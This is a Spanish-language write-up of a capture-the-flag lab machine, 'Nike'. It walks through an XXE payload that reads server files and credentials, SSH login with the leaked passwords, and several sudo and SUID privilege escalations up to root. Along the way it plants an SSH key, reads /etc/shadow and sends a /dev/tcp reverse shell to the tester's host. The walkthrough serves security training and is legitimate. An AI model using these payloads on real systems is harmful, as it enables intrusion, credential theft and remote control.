# Reconocimiento

En primer lugar, se identifica la IP de la máquina objetivo con `netdiscover` 

```zsh
netdiscover

Currently scanning: 192.168.0.0/16   |   Screen View: Unique Hosts                                                                             
                                                                                                                                               
9 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 540                                                                                
_____________________________________________________________________________  
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname         
-----------------------------------------------------------------------------  
...                          
192.168.1.140   08:00:27:b0:51:aa      1      60  PCS Systemtechnik GmbH
...
```

Una vez identificada la IP, se escanean los puertos de la máquina con Nmap

```zsh
nmap --top-ports 1000 --open -sT -A -T5 192.168.1.140

PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)  
| ssh-hostkey:    
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)  
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)  
80/tcp open  http    Apache httpd 2.4.62 ((Debian))  
|_http-title: Tienda Nike - Zapatillas  
|_http-server-header: Apache/2.4.62 (Debian)  
...
```

A priori, no hay más que un servidor SSH y una web, por lo que el siguiente paso va a ser visitar la web para ver si se pueden identificar vectores de ataque. Un vistazo a la página no revela nada del otro mundo a primera vista, sin embargo, al hacer un poco de fuzzing en la raíz de la web, si hay algunos resultados llamativos.

# Encontrando los endpoints

```zsh
ffuf -u http://192.168.1.140/FUZZ \  
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt \  
-c -r -t 150 -ic -fw 20 && notify "Fuzzing de archivos done"           
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://192.168.1.140/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt  
:: Follow redirects : true  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 150  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response words: 20  
________________________________________________  
  
.                       [Status: 200, Size: 1622, Words: 243, Lines: 65, Duration: 18ms]  
upload.php              [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 19ms]  
styles.css              [Status: 200, Size: 1395, Words: 275, Lines: 91, Duration: 19ms]  
script.js               [Status: 200, Size: 193, Words: 30, Lines: 10, Duration: 19ms]  
index.html              [Status: 200, Size: 1622, Words: 243, Lines: 65, Duration: 2018ms]  
datos.php               [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
```

Trasteando con uno de estos endpoints (upload.php), pruebo a mandarle cosas por POST para ver como se comporta, la primera respuesta me llama la atención, porque admite información por post, pero parece que en formato XML (porque pide tag de apertura).
Esto se confirma con el segundo comando que use.

```zsh
curl -d "test" http://192.168.1.140/upload.php             
Start tag expected, '<' not found

curl -d "<test>test</test>" http://192.168.1.140/upload.php  
<?xml version="1.0"?>  
<test>test</test>
```

Esto habilita la posibilidad de llevar a cabo un ataque XXE, con el que se va a poder leer archivos del sistema, en este caso voy a empezar por leer el archivo datos.php, que daba un código 500 al ser visitado desde el navegador.

# XXE

```zsh
curl -d '<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE test [     
 <!ENTITY xxe SYSTEM "file:///var/www/html/datos.php">  
]>  
<test>&xxe;</test>' http://192.168.1.140/upload.php/  
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE test [  
<!ENTITY xxe SYSTEM "file:///var/www/html/datos.php">  
]>  
<test><?php $user = "mike";  
$pass = "oK)Lpk3#mmK!#p";  
$dni_user = "74239813V";  
$num_user = "+34 678 912 395";  
  
$user = "wvverez";  
$pass = "jKolpmd2f0dmko07x!@kk%";  
$dni_user = "679145983X";  
$num_user = "+ 34 922 178 452"  
  
$user = "pylon";  
$pass = "rp&swp)lkfg23lio";  
$dni_user = "632159321M";  
$num_user = "+ 34 611 459 112";  
  
$user = "macci";  
$pass = "koplsdm$%#jokk*mloker";  
$dni_user = "547891239U";  
$num_user = "+ 34 678 125 226";  
  
$user = "n";  
$pass = "kjlso%#mssa*nmccasca$%";  
$dni_user = "432986104B";  
$num_user = "+34 911 763 689";  
  
if ($_SERVER['REQUEST_METHOD'] !== 'CLI') {  
   http_response_code(403);  
   die("Access Denied.");  
}  
?>  
</test>
```

Bingo! Ahora tenemos acceso a una suerte de base de datos (extremadamente rudimentaria) con varias contraseñas, aprovechamos el XXE de nuevo para comparar los usuarios de la DB con los del sistema.

```zsh
curl -d '<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE test [     
 <!ENTITY xxe SYSTEM "file:///etc/passwd">               
]>  
<test>&xxe;</test>' http://192.168.1.140/upload.php/  
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE test [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>  
<test>root:x:0:0:root:/root:/bin/bash  
... 
mike:x:1000:1000:mike,,,:/home/mike:/bin/rbash  
n:x:1001:1001:n,,,:/home/n:/bin/bash  
pylon:x:1002:1002:pylon,,,:/home/pylon:/bin/bash  
macci:x:1003:1003:macci,,,:/home/macci:/bin/bash  
wvverez:x:1004:1004:wvverez,,,:/home/wvverez:/bin/bash  
</test>
```

Parece que tanto *mike*, como *pylon*, *macxiy*, *wvverez* y *n* acaban de ser víctimas de una brecha de seguridad, como el DNI no está cifrado, y en principio no reconozco ningún algoritmo de hashing ni cifrado en las contraseñas, creo que están almacenadas en texto plano, así que solo queda probarlas.

# Pwned!
```zsh
ssh mike@192.168.1.140  
mike@192.168.1.140's password:    
Linux TheHackersLabs-Nike 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64  
  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Tue Mar 17 14:01:34 2026 from 192.168.1.159  
mike@TheHackersLabs-Nike:~$ echo $SHELL  
/bin/rbash  
mike@TheHackersLabs-Nike:~$ id  
-rbash: id: orden no encontrada  
mike@TheHackersLabs-Nike:~$
```

Sin embargo, no va a ser tan fácil, ya que tras probar todos los usuarios, veo que el único que ha reciclado su contraseña es *mike*,  y tiene una shell un tanto especial: `rbash`.

`rbash` o Restricted Bash es una versión limitada de `bash` que impide muchas de las funciones que normalmente se usarían para pivotar de usuario o escalar privilegios. De todas formas, esto importa poco, porque como hemos accedido mediante SSH, se puede especificar el comando con el que se quiere entrar a la terminal.

```zsh
ssh mike@192.168.1.140 -t sh  
mike@192.168.1.140's password: 
$ id
uid=1000(mike) gid=1000(mike) grupos=1000(mike),100(users)
```

# Pivotando a *n*
Rápidamente averiguamos que se puede ejecutar `java` como el usuario *n*, sin así que siguiendo las instrucciones de [GTFObins](https://gtfobins.org/gtfobins/java/#shell) al respecto, se trata de escalar, pero surge un problema, java no encuentra la clase "Shell".

```sh
$ sudo -l  
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
Matching Defaults entries for mike on TheHackersLabs-Nike:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User mike may run the following commands on TheHackersLabs-Nike:  
   (n) NOPASSWD: /usr/bin/java  
   
$ cat >Shell.java <<EOF  
public class Shell {  
   public static void main(String[] args) throws Exception {  
       new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();  
   }  
}  
EOF  
  
javac Shell.java  
> > > > > > $ $    
$ $ ls  
bin  Shell.class  Shell.java  
$ javac Shell.java  
$ ls  
bin  Shell.class  Shell.java  
$ sudo -u n java Shell  
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
Error: no se ha encontrado o cargado la clase principal Shell  
Causado por: java.lang.ClassNotFoundException: Shell  
```

Resulta que al usar `sudo -u n` en un directorio donde *n* no tiene permisos de lectura, no encontraba la clase. Basta con copiarlo a `/tmp` e intentarlo de nuevo. Además, por fin puedo quitarme esta horrible shell de encima.

```sh
$ cp Shell.class /tmp  
$ cd /tmp  
$ sudo -u n /usr/bin/java Shell  
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
$ id  
uid=1001(n) gid=1001(n) grupos=1001(n),100(users)  
$ bash
n@TheHackersLabs-Nike:/tmp$ id  
uid=1001(n) gid=1001(n) grupos=1001(n),100(users)
```

# Pylon
Para salir del usuario *n*, se encuentra que se puede ejecutar el script en `/opt/suma.py` como el usuario *pylon*, es sencillo pivotar, ya que tenemos permisos de escritura sobre dicho archivo.

```zsh
n@TheHackersLabs-Nike:~$ sudo -l  
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
Matching Defaults entries for n on TheHackersLabs-Nike:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User n may run the following commands on TheHackersLabs-Nike:  
   (pylon) NOPASSWD: /usr/bin/python3 /opt/suma.py  
n@TheHackersLabs-Nike:~$ ls -la /opt/suma.py    
-rw-r--r-- 1 n n 5 mar 17 14:41 /opt/suma.py  
n@TheHackersLabs-Nike:~$ nano /opt/suma.py    
n@TheHackersLabs-Nike:~$ cat /opt/suma.py    
import os  
os.execl("/bin/bash", "bash")  
  
n@TheHackersLabs-Nike:~$ sudo -u pylon python3 /opt/suma.py    
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
pylon@TheHackersLabs-Nike:/home/n$ id  
uid=1002(pylon) gid=1002(pylon) grupos=1002(pylon),100(users)  
pylon@TheHackersLabs-Nike:/home/n$
```

# Macci
Lo que a priori parece una escalada sencilla, ya que podemos ejecutar el binario `logrotate` como el usuario *macci*, se convierte en un lío tremendo causado por los permisos con archivos y carpetas, al final la solución no es tan complicada: crear una carpeta que controlemos al completo y crear ahí los archivos con los que pivotar a *macci*. Sin embargo, no resulta tan sencillo, ya que el planteamiento que estaba usando en principio no funcionaba.

```zsh
pylon@TheHackersLabs-Nike:/tmp/pwn$ sudo -l  
sudo: unable to resolve host TheHackersLabs-Nike: Nombre o servicio desconocido  
Matching Defaults entries for pylon on TheHackersLabs-Nike:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User pylon may run the following commands on TheHackersLabs-Nike:  
   (macci) NOPASSWD: /usr/sbin/logrotate  
...
pylon@TheHackersLabs-Nike:/tmp$ mkdir nike  
pylon@TheHackersLabs-Nike:/tmp$ cd nike/  
pylon@TheHackersLabs-Nike:/tmp/nike$ chmod 777 .  
pylon@TheHackersLabs-Nike:/tmp/nike$ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/nike/shell.sh ## Se intenta con bash -p   
pylon@TheHackersLabs-Nike:/tmp/nike$ chmod +x /tmp/nike/shell.sh   
pylon@TheHackersLabs-Nike:/tmp/nike$ touch /tmp/nike/dummy.log  
pylon@TheHackersLabs-Nike:/tmp/nike$ echo -e '"/tmp/nike/dummy.log" {\n    mail x@x.x\n}' > /tmp/nike/pwn.conf  
pylon@TheHackersLabs-Nike:/tmp/nike$ sudo -u macci /usr/sbin/logrotate -f -s /tmp/nike/pwn.state -m /tmp/nike/shell.sh /tmp/nike/pwn.conf  
pylon@TheHackersLabs-Nike:/tmp/nike$ id  ## La escalada falla porque la shell se ha abierto en segundo plano
uid=1002(pylon) gid=1002(pylon) grupos=1002(pylon),100(users)  
```

Esto se debe a que estoy intentando ejecutar `bash -p` en un contexto en el que no acaba de tener sentido, ya que el proceso que ejecuta el comando está en segundo plano, y muere al no tener conectado ningún dispositivo `tty`, al final, opto por darme una revshell a otra terminal y funciona a la perfección.

```zsh
pylon@TheHackersLabs-Nike:/tmp/nike$ echo -e '#!/bin/bash\n/bin/bash -c "bash -i >& /dev/tcp/192.168.1.159/444 0>&1"' > /tmp/nike/shell.sh  
pylon@TheHackersLabs-Nike:/tmp/nike$ touch dummy.log    
pylon@TheHackersLabs-Nike:/tmp/nike$ echo "TEST" > dummy.log  
pylon@TheHackersLabs-Nike:/tmp/nike$ sudo -u macci /usr/sbin/logrotate -f -s /tmp/nike/pwn.state -m /tmp/nike/shell.sh /tmp/nike/pwn.conf  

-------------------------------------------------------------------------------------------------------------------------------
## En la otra terminal, tras ponerme en escucha
sudo penelope -p 444
[+] Listening for reverse shells on 0.0.0.0:444 →  127.0.0.1 • 192.168.1.159 • 172.17.0.1

macci@TheHackersLabs-Nike:/tmp/nike$ id  
uid=1003(macci) gid=1003(macci) grupos=1003(macci),100(users)
```

# SSH
Esta resulta mucho más sencilla, ya que el comando `dd` que se puede ejecutar como wvverez permite escribir a archivos, bastará con escribir nuestra llave pública a las llaves autorizadas del usuario.

```zsh
macci@TheHackersLabs-Nike:~$ sudo -l  
Matching Defaults entries for macci on TheHackersLabs-Nike:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User macci may run the following commands on TheHackersLabs-Nike:  
   (wvverez) NOPASSWD: /usr/bin/dd

## Antes, en nuestra máquina, generamos un par de llaves RSA: ssh-keygen -t rsa -f user_key
## Luego, copiamos el contenido de user_key.pub y eso es lo que se se copia a authorized_keys con echo 

macci@TheHackersLabs-Nike:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpECJENrTcXKuGoD25xz4GtJ3h7Wl6szyw8c6oZlHRDgD7/Pa2XVUvA5NavgIllzNl6kr  
c39+FPfg3dI8cmHY8iyxFb3vkgK7MvIN3bx/Zsx3kBeBYsGgmoroF1PfbhR5p/1o8wYuwfPTFRp9dAAQ/NwsNALiyFtQT0ucH3Qym13Y9J6ICF84J9KQNpeTaS2+r3z6ucV5nwBgyl5EoS  
guLq7x+Lwx9qxwYvHP/FMfevpu2zsRGJ4m6SG+tqItLoltLQQae/q2keqcHzP/joluV0rTaWMj+RQQuyE/Xb5qclv6av7/t+T5+jXd3BcgO55TyXKpLWW40cH52RAiBa5n1eb4X5U2ePTJ  
PjBiAyp4ukwTtVPwUljJdV4P1WTn7QZbxZz2BO8D9DyuOcRnJ1wqtWjD+dhRaguMIMArBBUvQicYFgr37DXH8DRL8bKZrX/NKjlwhspp0rEEKgDNYEFlN2ucQGLcC9FEVsF4j6cdnr5uo2  
2LKeGNdU8A9sCP17R8= kali@kali" | sudo -u wvverez dd of=/home/wvverez/.ssh/authorized_keys  
1+1 records in  
1+1 records out  
563 bytes copied, 0,000616121 s, 914 kB/s  
macci@TheHackersLabs-Nike:~$

-------------------------------------------------------------------------------------------------------------------------------
# En otra terminal
ssh -i user_key wvverez@192.168.1.140
Last login: Tue Feb 17 22:27:10 2026 from 192.168.91.128
wvverez@TheHackersLabs-Nike:~$ id
uid=1004(wvverez) gid=1004(wvverez) grupos=1004(wvverez),100(users),1005(ctf_admins)

```

# Primera flag
En este usuario se encuentra la primera flag
```zsh
wvverez@TheHackersLabs-Nike:~$ ls  
flag.txt  
wvverez@TheHackersLabs-Nike:~$ cat flag.txt    
**********************
```

Indagando en los permisos del usuario, se identifica una herramienta que parece hecha a mano con el bit SUID, probandola un poco, veo que permite la ejecución de los comandos `ls`, `cat`, y `sh`.

```zsh
wvverez@TheHackersLabs-Nike:~$ find / -perm -u=s -type f 2>/dev/null  
/usr/local/bin/sys_monitor  
...  
wvverez@TheHackersLabs-Nike:~$ sys_monitor  
Usage: sys_monitor <function> <input>  
Functions: 1,2,3  
wvverez@TheHackersLabs-Nike:~$ sys_monitor 1 test  
Procesando: test  
ls: no se puede acceder a 'test': No existe el fichero o el directorio  
wvverez@TheHackersLabs-Nike:~$ sys_monitor 2 test  
cat: /var/log/test: No existe el fichero o el directorio  
wvverez@TheHackersLabs-Nike:~$ sys_monitor 3 test  
wvverez@TheHackersLabs-Nike:~$ sys_monitor 3 /tmp/  
sh: 1: /tmp/: Permission denied  
wvverez@TheHackersLabs-Nike:~$
```

Está pensado para acceder a logs, pero no esta protegido correctamente, de manera que usando rutas relativas a `/var/log` en lugar de absolutas, se puede comprobar que los privilegios son totales.

```zsh
wvverez@TheHackersLabs-Nike:~$ sys_monitor 2 /etc/shadow  
cat: /var/log//etc/shadow: No existe el fichero o el directorio  
wvverez@TheHackersLabs-Nike:~$ sys_monitor 2 ../../etc/shadow  
root:$y$j9T$cz.2yohYGuXckqXl7NfLr0$.KBfqG0YVZW/v6ZdDajE8UCyBQts4Qj7/FAuN.Ax9GB:20502:0:99999:7:::  
...
mike:$y$j9T$cgsaIxm5rOaUIXcLDf6xg.$C2foXKhj7GX8vaET9aJZpSUZkp2mgD1uVu.gPiOYT0D:20501:0:99999:7:::  
n:$y$j9T$eRGN3jnqBAknheiJ.YZEo1$x0JCo1Idqwn2lKjwnCWPah5MAiLI0R29ePT0vYpm2h0:20501:0:99999:7:::  
pylon:$y$j9T$iycpobDCegYCu84IWxf52/$DJ2IVccQyOaqG97xPXfRNzfc/D8azBYP5x1rQNsXmz/:20501:0:99999:7:::  
macci:$y$j9T$tcwWJulnv/iEz22RBFtnP0$hllrda1aEPrawYAHZ3pxHjM6xfHbPIPGEuxZfCMLLdA:20501:0:99999:7:::  
wvverez:$y$j9T$qAGZPUMDVFjPUJmExkE.r/$MkcDbbOkAY2jD4dAplibjGmKatHr3ztOU5NRiN2Vqi9:20501:0:99999:7:::  
wvverez@TheHackersLabs-Nike:~$
```

Al poder ejecutar sh, va a ser una escalada sencilla, vamos a un directorio con permisos, creamos un archivo que ejecute `bash -p` y lo corremos con `sys_monitor`

```zsh
wvverez@TheHackersLabs-Nike:~$ cd /tmp/  
wvverez@TheHackersLabs-Nike:/tmp$ touch root.sh  
wvverez@TheHackersLabs-Nike:/tmp$ nano root.sh    
wvverez@TheHackersLabs-Nike:/tmp$ cat root.sh    ## Contenido de root.sh
#!/bin/bash  
  
bash -p  

wvverez@TheHackersLabs-Nike:/tmp$ chmod 777 root.sh    
wvverez@TheHackersLabs-Nike:/tmp$ sys_monitor 3 ../../tmp/root.sh    
root@TheHackersLabs-Nike:/tmp# id  
uid=0(root) gid=1004(wvverez) grupos=1004(wvverez),100(users),1005(ctf_admins)
```

Ya solo queda coger la última flag

```zsh
root@TheHackersLabs-Nike:/tmp# cat /root/root.txt    
********************  
root@TheHackersLabs-Nike:/tmp# Happy hacking!!
```